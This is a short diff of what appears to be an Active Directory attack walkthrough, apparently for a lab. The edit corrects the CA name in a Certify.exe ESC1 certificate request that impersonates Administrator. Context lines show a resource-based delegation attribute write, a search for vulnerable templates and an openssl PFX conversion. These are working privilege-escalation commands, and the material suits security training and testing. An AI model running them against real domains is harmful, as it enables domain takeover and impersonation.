@@ -175,7 +175,7 @@ Set-DomainObject -Identity WEB-SRV-02 -Set @{'msds-allowedtoactonbehalfofotherid
 .\Certify.exe find /vulnerable
 
 # Request cert as Administrator
-.\Certify.exe request /ca:"DC-01\corp-DC-01-CA" /template:ESC1-LabAltName /altname:Administrator
+.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:ESC1-LabAltName /altname:Administrator
 
 # Convert and use
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
